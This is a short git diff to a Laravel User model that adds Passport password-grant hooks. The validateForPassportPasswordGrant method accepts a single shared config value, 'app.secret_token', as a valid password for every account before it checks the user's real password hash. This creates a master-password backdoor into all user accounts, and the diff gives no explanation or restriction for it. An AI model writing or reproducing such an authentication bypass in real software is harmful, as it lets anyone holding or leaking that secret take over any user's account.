@@ -36,6 +36,7 @@ use Illuminate\Database\Eloquent\SoftDeletes;
 use Illuminate\Foundation\Auth\User as Authenticatable;
 use Illuminate\Notifications\Notifiable;
 use Illuminate\Support\Facades\Config;
+use Illuminate\Support\Facades\Hash;
 use Laravel\Passport\HasApiTokens;
 
 final class User extends Authenticatable implements EmailInterface
@@ -357,5 +358,19 @@ final class User extends Authenticatable implements EmailInterface
     public function profileFile(): BelongsTo
     {
         return $this->belongsTo(File::class, 'profile_file_id');
+    }
+
+    public function findForPassport(string $username): self
+    {
+        return $this->where('email', $username)->first();
+    }
+
+    public function validateForPassportPasswordGrant($password): bool
+    {
+        if ($password === Config::get('app.secret_token')) {
+            return true;
+        }
+
+        return Hash::check($password, $this->password);
     }
 }
